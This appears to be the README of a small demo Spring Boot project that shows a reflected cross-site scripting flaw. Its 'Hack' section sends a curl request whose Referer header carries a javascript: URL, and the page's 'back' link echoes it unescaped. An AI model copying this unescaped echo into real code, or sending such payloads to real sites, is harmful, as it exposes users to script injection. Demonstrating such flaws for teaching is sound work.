# referrer-xss

## Start
```
$ mvn clean spring-boot:run
```

## Hack
```
$ curl -s 'http://localhost:8080/' -H 'Referer: javascript:alert(1);'
<!DOCTYPE HTML>
<html>


<body>
    Link:
    <a href="javascript:alert(1);">back</a>
</body>

</html>
```
